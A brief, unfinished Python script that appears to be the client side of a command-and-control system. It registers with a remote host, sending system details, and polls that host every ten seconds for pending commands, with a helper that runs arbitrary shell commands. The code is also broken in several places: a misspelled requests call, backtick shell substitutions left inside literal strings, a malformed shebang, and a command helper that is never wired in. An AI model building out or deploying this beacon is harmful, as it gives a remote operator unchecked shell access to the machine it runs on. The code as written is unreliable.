#!`which python`


import requests
import time
import json
import subprocess


session=request.session()


CLIENTNAME="`clientname`"
UNAME="`uname -a`"
HOST="`echo $HOST`"
CLIENTID=json.loads(session.post('http://' + HOST + '/register_client',data={
    'clientname':CLIENTNAME,
    'uname':UNAME,
}).text)['clientid']

def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    r=session.post('http://'+HOST+'/get_pending', data={
        'clientname':CLIENTNAME,
        'uname':UNAME,
        'clientid':CLIENTID,
    })
    control=json.loads(r.text)
    print(control)
    response={'clientid':CLIENTID}
    
    print(response)
    if len(response) > 1:
        session.post('http://'+HOST+'/submit_pending',data=response)
    time.sleep(10)
    

